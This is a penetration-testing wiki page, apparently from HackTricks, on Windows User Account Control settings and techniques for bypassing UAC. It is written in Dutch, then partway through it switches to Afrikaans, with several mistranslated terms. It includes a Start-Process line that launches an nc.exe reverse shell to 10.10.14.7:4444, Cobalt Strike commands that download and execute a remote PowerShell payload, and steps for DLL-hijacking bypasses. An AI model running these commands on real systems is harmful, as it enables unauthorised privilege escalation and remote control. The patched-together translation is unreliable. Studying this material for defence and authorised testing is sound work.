# UAC - Gebruikersrekeningbeheer

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**officiële PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Doe mee aan de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegramgroep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om eenvoudig workflows te bouwen en te automatiseren met behulp van 's werelds meest geavanceerde communitytools.\
Krijg vandaag nog toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is een functie die een **toestemmingsprompt voor verhoogde activiteiten** mogelijk maakt. Applicaties hebben verschillende `integriteitsniveaus` en een programma met een **hoog niveau** kan taken uitvoeren die **mogelijk het systeem compromitteren**. Wanneer UAC is ingeschakeld, worden applicaties en taken altijd **uitgevoerd onder de beveiligingscontext van een niet-beheerdersaccount**, tenzij een beheerder deze applicaties/taken expliciet machtigt om toegang op beheerdersniveau tot het systeem uit te voeren. Het is een handige functie die beheerders beschermt tegen onbedoelde wijzigingen, maar wordt niet beschouwd als een beveiligingsgrens.

Voor meer informatie over integriteitsniveaus:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wanneer UAC actief is, krijgt een beheerdersgebruiker 2 tokens: een standaardgebruikerstoets om reguliere acties als regulier niveau uit te voeren, en een met de beheerdersprivileges.

Deze [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreekt in detail hoe UAC werkt, inclusief het aanmeldingsproces, de gebruikerservaring en de UAC-architectuur. Beheerders kunnen beveiligingsbeleid gebruiken om specifiek voor hun organisatie te configureren hoe UAC werkt op lokaal niveau (met behulp van secpol.msc) of geconfigureerd en uitgerold via Group Policy Objects (GPO) in een Active Directory-domeinomgeving. De verschillende instellingen worden in detail besproken [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Er zijn 10 Group Policy-instellingen die kunnen worden ingesteld voor UAC. De volgende tabel geeft aanvullende details:

| Group Policy-instelling                                                                                                                                                                                                                                                                                                                                                       | Register Key                | Standaardinstelling                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode voor de ingebouwde beheerdersaccount](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Uitgeschakeld                                                     |
| [User Account Control: Toestaan dat UIAccess-toepassingen om verhoging vragen zonder het beveiligde bureaublad te gebruiken](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Uitgeschakeld                                                     |
| [User Account Control: Gedrag van de verhogingsprompt voor beheerders in de modus voor goedkeuring door beheerder](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Vragen om toestemming voor niet-Windows-binaries                  |
| [User Account Control: Gedrag van de verhogingsprompt voor standaardgebruikers](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Vragen om referenties op het beveiligde bureaublad                 |
| [User Account Control: Detecteren van toepassingsinstallaties en vragen om verhoging](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ingeschakeld (standaard voor thuis) Uitgeschakeld (standaard voor bedrijven) |
| [User Account Control: Alleen verhogen van uitvoerbare bestanden die zijn ondertekend en gevalideerd](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Uitgeschakeld                                                     |
| [User Account Control: Alleen verhogen van UIAccess-toepassingen die zijn geïnstalleerd op beveiligde locaties](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ingeschakeld                                                      |
| [User Account Control: Alle beheerders uitvoeren in de modus voor goedkeuring door beheerder](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ingeschakeld                                                      |
| [User Account Control: Overschakelen naar het beveiligde bureaublad bij het vragen om verhoging](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ingeschakeld                                                      |
| [User Account Control: Virtualiseer schrijffouten van bestanden en registers naar locaties per gebruiker](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ingeschakeld                                                      |
### UAC Bypass Teorie

Sommige programme word outomaties **geëleveer** as die **gebruiker behoort** tot die **administrateur groep**. Hierdie binnerwerke het binne-in hul _**Manifeste**_ die _**autoElevate**_ opsie met die waarde _**True**_. Die binnerste moet ook deur Microsoft **onderteken** word.

Om dan die **UAC te omseil** (verhoog vanaf **medium** integriteitsvlak **na hoog**) gebruik sommige aanvallers hierdie soort binnerwerke om **arbitrêre kode uit te voer** omdat dit uitgevoer sal word vanuit 'n **hoë integriteitsproses**.

Jy kan die _**Manifest**_ van 'n binnerste nagaan deur die instrument _**sigcheck.exe**_ van Sysinternals te gebruik. En jy kan die **integriteitsvlak** van die prosesse sien deur _Process Explorer_ of _Process Monitor_ (van Sysinternals) te gebruik.

### Kontroleer UAC

Om te bevestig of UAC geaktiveer is, doen die volgende:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
As dit **`1`** is, is UAC **geaktiveer**, as dit **`0`** is of dit **bestaan nie**, is UAC **onaktief**.

Dan, kontroleer **watter vlak** gekonfigureer is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* As **`0`** dan sal UAC nie vra nie (soos **uitgeschakel**)
* As **`1`** sal die admin gevra word vir gebruikersnaam en wagwoord om die binêre lêer met hoë regte uit te voer (op 'n veilige lessenaar)
* As **`2`** (**Altyd kennisgewing gee**) sal UAC altyd vra vir bevestiging aan die administrateur wanneer hy iets probeer uitvoer met hoë bevoegdhede (op 'n veilige lessenaar)
* As **`3`** soos `1` maar nie noodwendig op 'n veilige lessenaar nie
* As **`4`** soos `2` maar nie noodwendig op 'n veilige lessenaar nie
* as **`5`** (**verstek**) sal dit die administrateur vra om bevestiging om nie-Windows-binêre lêers met hoë bevoegdhede uit te voer

Dan moet jy kyk na die waarde van **`LocalAccountTokenFilterPolicy`**\
As die waarde **`0`** is, kan slegs die gebruiker met RID 500 (**ingeboude Administrateur**) admin-take uitvoer sonder UAC, en as dit `1` is, kan **alle rekeninge binne die "Administrateurs"**-groep dit doen.

En, kyk uiteindelik na die waarde van die sleutel **`FilterAdministratorToken`**\
As **`0`**(verstek), kan die **ingeboude Administrateur-rekening** afstandsadministrasietake uitvoer en as **`1`** kan die ingeboude Administrateur-rekening **nie** afstandsadministrasietake uitvoer nie, tensy `LocalAccountTokenFilterPolicy` op `1` ingestel is.

#### Opsomming

* As `EnableLUA=0` of **nie bestaan nie**, **geen UAC vir enigiemand nie**
* As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1` , geen UAC vir enigiemand nie**
* As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=0`, geen UAC vir RID 500 (Ingeboude Administrateur)**
* As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=1`, UAC vir almal**

Hierdie inligting kan ingesamel word met behulp van die **metasploit**-module: `post/windows/gather/win_privs`

Jy kan ook die groepe van jou gebruiker nagaan en die integriteitsvlak kry:
```
net user %username%
whoami /groups | findstr Level
```
## UAC deurloop

{% hint style="info" %}
Let daarop dat as jy grafiese toegang tot die slagoffer het, is UAC deurloop reguit vorentoe, aangesien jy eenvoudig op "Ja" kan klik wanneer die UAC-aanvraag verskyn.
{% endhint %}

Die UAC deurloop is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses word uitgevoer in 'n medium integriteitskonteks, en jou gebruiker behoort tot die administrateursgroep**.

Dit is belangrik om te vermeld dat dit **veel moeiliker is om die UAC te deurloop as dit in die hoogste veiligheidsvlak (Altyd) is as in enige van die ander vlakke (Verstek).**

### UAC gedeaktiveer

As die UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **'n omgekeerde dop met administratiewe voorregte** (hoë integriteitsvlak) uitvoer deur iets soos die volgende te gebruik:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC deurloop met token-duplikasie

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "deurloop" (volle lêersisteemtoegang)

As jy 'n skulp met 'n gebruiker wat binne die Administrateursgroep is, het, kan jy die C$ gedeelte via SMB (lêersisteem) plaaslik op 'n nuwe skyf koppel en jy sal toegang hê tot alles binne die lêersisteem (selfs die Administrateur se tuisgids).

{% hint style="warning" %}
**Dit lyk asof hierdie truuk nie meer werk nie**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC omseiling met Cobalt Strike

Die Cobalt Strike tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak ingestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **omseil**.

### KRBUACBypass

Dokumentasie en hulpmiddel in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC omseil aanvalle

[**UACME**](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC omseil aanvalle is. Let daarop dat jy UACME sal moet **samestel met behulp van Visual Studio of msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy nodig het**.\
Wees **versigtig**, want sommige omseilings sal **ander programme laat vra** wat die **gebruiker sal waarsku** dat iets aan die gang is.

UACME het die **bouweergawe waarin elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes affekteer:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://af.wikipedia.org/wiki/Windows\_10\_weergawe\_geskiedenis) bladsy te gebruik, kry jy die Windows vrystelling `1607` van die bou weergawes.

#### Meer UAC omseiling

**Al** die tegnieke wat hier gebruik word om UAC te omseil, **vereis** 'n **volledige interaktiewe skerm** met die slagoffer ( 'n gewone nc.exe skerm is nie genoeg nie).

Jy kan 'n **meterpreter** sessie kry. Migreer na 'n **proses** wat die **Session** waarde gelyk is aan **1** het:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ behoort te werk)

### UAC Omseiling met GUI

As jy toegang het tot 'n **GUI, kan jy net die UAC versoek aanvaar** wanneer jy dit kry, jy het nie regtig 'n omseiling nodig nie. Dus, as jy toegang tot 'n GUI kry, kan jy die UAC omseil.

Verder, as jy 'n GUI-sessie kry wat iemand gebruik het (moontlik via RDP), is daar **sekere hulpmiddels wat as administrateur sal loop** waarvandaan jy byvoorbeeld 'n **cmd** as administrateur kan **uitvoer** sonder om weer deur UAC gevra te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit mag dalk 'n bietjie meer **steels** wees.

### Lawaaierige kragtige UAC omseiling

As jy nie omgee om lawaaierig te wees nie, kan jy altyd iets soos [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) uitvoer wat **vra om toestemmings te verhoog totdat die gebruiker dit aanvaar**.

### Jou eie omseiling - Basiese UAC omseiling metodologie

As jy kyk na **UACME**, sal jy opmerk dat **die meeste UAC omseilings 'n Dll Hijacking kwesbaarheid misbruik** (veral deur die kwaadwillige dll op _C:\Windows\System32_ te skryf). [Lees hierdie om te leer hoe om 'n Dll Hijacking kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking.md).

1. Vind 'n binêre lêer wat **outomaties verhoog** (kontroleer dat wanneer dit uitgevoer word, dit in 'n hoë integriteitsvlak loop).
2. Met procmon vind "**NAME NOT FOUND**" gebeure wat vatbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sommige **beskermde paaie** (soos C:\Windows\System32) moet **skryf** waar jy nie skryfregte het nie. Jy kan dit omseil deur gebruik te maak van:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit maak dit moontlik om die inhoud van 'n CAB-lêer binne beskermde paaie uit te pak (omdat hierdie hulpmiddel van 'n hoë integriteitsvlak uitgevoer word).
2. **IFileOperation**: Windows 10.
4. Maak 'n **skripsie** gereed om jou DLL binne die beskermde pad te kopieer en die kwesbare en outomaties verhoogde binêre uit te voer.

### 'n Ander UAC omseiling tegniek

Bestaan daarin om te kyk of 'n **outomaties verhoogde binêre** probeer **lees** vanaf die **register** die **naam/pad** van 'n **binêre** of **opdrag** wat uitgevoer moet word (dit is meer interessant as die binêre hierdie inligting binne die **HKCU** soek).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik werkstrome te bou en te outomatiseer met behulp van die wêreld se **mees gevorderde** gemeenskaps hulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
